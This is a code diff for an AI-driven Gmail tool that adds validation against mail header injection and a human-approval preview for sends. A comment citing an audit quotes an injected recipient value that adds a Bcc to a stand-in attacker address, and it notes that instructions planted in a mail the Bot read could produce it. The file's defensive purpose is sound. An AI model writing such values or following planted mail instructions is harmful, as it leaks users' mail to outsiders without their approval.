@@ -1,3 +1,10 @@
+import type { CallPreview } from "../computer/approvals";
+import {
+  previewList,
+  previewOf,
+  previewText,
+  previewValue,
+} from "./call-preview";
 import type { McpCallResult, McpTool } from "./mcp";
 import {
   asResult,
@@ -9,6 +16,7 @@ import {
   unknownTool,
   vendorRequest,
 } from "./rest-support";
+import { PluginRefusedError } from "./store";
 import { TIMEOUT_MS } from "./timeouts";
 
 /**
@@ -16,8 +24,10 @@ import { TIMEOUT_MS } from "./timeouts";
  *
  * THE SEND IS THE POINT AND THE DANGER. Everything else here is a read a person can undo by
  * ignoring it; a sent mail is gone, under their name, to somebody who is not in the room. That is
- * why `send_message` is guarded in the catalogue entry rather than merely marked a write: a person
- * answers for every single one, whatever the written boundary says.
+ * why `send_message` is guarded in the catalogue entry rather than merely marked a write: whatever
+ * the written boundary says, the send stops for a person, and the card shows them who it goes to,
+ * the subject and the text ({@link previewCall}). A person who presses 이 도구 항상 허용 there lets
+ * that Bot's later sends go without asking, as the button says.
  *
  * Drafting is deliberately a separate tool from sending, and not a flag on one. A Bot that can only
  * draft is useful and safe, and the difference between the two has to be visible in the tool name
@@ -176,20 +186,135 @@ export function encodedHeader(value: string): string {
   return `=?UTF-8?B?${Buffer.from(value, "utf8").toString("base64")}=?=`;
 }
 
-/** One plain-text mail as the raw bytes Gmail's `raw` field takes. */
+/** The fact a recipient that is not a plain list of mail addresses is refused with. */
+const RECIPIENT_INVALID = "laf:mail_recipient_invalid";
+
+/** The fact a subject that is not one line is refused with. */
+const SUBJECT_INVALID = "laf:mail_subject_invalid";
+
+/**
+ * One address, and nothing a header could be built out of around it.
+ *
+ * RFC 5322's dot-atom on both sides, ASCII only: the characters a local part may hold, dots only
+ * between them, and a domain of hostname labels with at least one dot. Deliberately narrower than
+ * the RFC's full `mailbox` — no display name, no quotes, no comments, no angle brackets — because
+ * each of those is a way to put text into a header that this code would then have to parse the
+ * same way every mail client does. A shop owner's Bot sends to `kim@shop.kr`; a model that writes
+ * `김민수 <kim@shop.kr>` is refused and told to send the address alone.
+ */
+const ADDRESS =
+  /^[A-Za-z0-9!#$%&'*+/=?^_`{|}~-]+(?:\.[A-Za-z0-9!#$%&'*+/=?^_`{|}~-]+)*@(?:[A-Za-z0-9](?:[A-Za-z0-9-]{0,61}[A-Za-z0-9])?\.)+[A-Za-z0-9](?:[A-Za-z0-9-]{0,61}[A-Za-z0-9])?$/;
+
+/** RFC 5321's limits on the two halves, which the pattern alone does not count. */
+const LOCAL_PART_MAX = 64;
+const ADDRESS_MAX = 254;
+
+/** A line break by any spelling a mail client or a renderer might honour. */
+const LINE_BREAK = /[\r\n\u0085\u2028\u2029]/;
+
+/**
+ * The addresses a `to` names, or null when it is not a plain comma-separated list of them.
+ *
+ * MEASURED 2026-09-16 (audit R4-02): `to` went into the header as the model wrote it, and the only
+ * thing in between trimmed the ends, so `friend@example.com\r\nBcc: attacker@evil.example` became
+ * a real `Bcc:` line. An instruction planted in a mail the Bot had just read was enough to write
+ * that value, and the card the send stopped on could not have shown it. Space around a comma is
+ * trimmed; any character inside an address the pattern above does not admit — a CR, an LF, a
+ * space, a `<` — refuses the whole list.
+ */
+export function mailRecipients(value: unknown): string[] | null {
+  if (typeof value !== "string") return null;
+  const addresses = value.split(",").map((part) => part.trim());
+  const usable = addresses.every(
+    (address) =>
+      address.length <= ADDRESS_MAX &&
+      ADDRESS.test(address) &&
+      address.indexOf("@") <= LOCAL_PART_MAX,
+  );
+  return usable ? addresses : null;
+}
+
+/**
+ * What is wrong with a mail's arguments before anything is built from them, or null.
+ *
+ * The recipient must be a list of at least one address — a blank one is not — and the subject one
+ * line. The subject never reached a header raw with a break in it — {@link encodedHeader} encodes
+ * anything that is not printable ASCII — but that was a side effect of a charset rule, and a
+ * subject is one line whatever language it is in. A blank subject or body is left to the send's
+ * own check in `callTool`, which has always said so.
+ */
+function mailProblem(args: Record<string, unknown>): string | null {
+  if (!mailRecipients(args.to)) return RECIPIENT_INVALID;
+  if (typeof args.subject === "string" && LINE_BREAK.test(args.subject)) {
+    return SUBJECT_INVALID;
+  }
+  return null;
+}
+
+const refuse = (fact: string): never => {
+  throw new PluginRefusedError(fact, null, fact);
+};
+
+/**
+ * One plain-text mail as the raw bytes Gmail's `raw` field takes.
+ *
+ * THE ONLY PLACE A HEADER IS SPELLED, so it checks for itself whoever called it: a caller that
+ * skipped every check upstream still cannot get a second header out of this.
+ */
 export function mimeMessage(input: {
   to: string;
   subject: string;
   body: string;
 }): string {
+  const recipients = mailRecipients(input.to) ?? refuse(RECIPIENT_INVALID);
+  if (LINE_BREAK.test(input.subject)) refuse(SUBJECT_INVALID);
   const headers = [
-    `To: ${input.to}`,
+    `To: ${recipients.join(", ")}`,
     `Subject: ${encodedHeader(input.subject)}`,
     "MIME-Version: 1.0",
     'Content-Type: text/plain; charset="UTF-8"',
     "Content-Transfer-Encoding: base64",
   ];
   return `${headers.join("\r\n")}\r\n\r\n${Buffer.from(input.body, "utf8").toString("base64")}`;
+}
+
+/**
+ * The check the call path runs before anybody is asked (`VendorTransport.validateArgs`).
+ *
+ * The same test `mimeMessage` makes, earlier: a mail whose recipient carries a header is refused
+ * before a question is opened about it, so nobody is asked to approve a send that will never go
+ * out — and the trail records the refusal against the call rather than a failure after a yes.
+ */
+export async function validateArgs(
+  _connection: { url: string },
+  toolName: string,
+  args: Record<string, unknown>,
+): Promise<void> {
+  if (toolName !== "send_message" && toolName !== "create_draft") return;
+  const problem = mailProblem(args);
+  if (problem) refuse(problem);
+}
+
+/**
+ * Who a send goes to, what it is called and what it says, for the card that asks about it.
+ *
+ * Read the way the send itself reads them — the same recipient list the `To:` line is joined from,
+ * the same trimmed subject and body — so the card cannot show one mail while another goes out. A
+ * draft has none: it stays in the person's own mailbox.
+ */
+export function previewCall(
+  toolName: string,
+  args: Record<string, unknown>,
+): CallPreview | null {
+  if (toolName !== "send_message") return null;
+  const recipients = mailRecipients(args.to);
+  // Already refused before any question is asked; nothing to show for a mail that cannot go.
+  if (!recipients || mailProblem(args)) return null;
+  return previewOf([
+    ...previewList("recipients", recipients),
+    ...previewValue("subject", stringArg(args, "subject")),
+    ...previewText("text", stringArg(args, "body")),
+  ]);
 }
 
 export async function callTool(
@@ -305,6 +430,11 @@ export async function callTool(
   }
 
   if (toolName === "create_draft" || toolName === "send_message") {
+    // Again, not only in `validateArgs`: this transport is also called directly, and a mail that
+    // skipped the call path must not skip the check. A refusal, so nothing below is reached.
+    const problem = mailProblem(args);
+    if (problem) refuse(problem);
+
     const to = stringArg(args, "to");
     const subject = stringArg(args, "subject");
     const text = stringArg(args, "body");
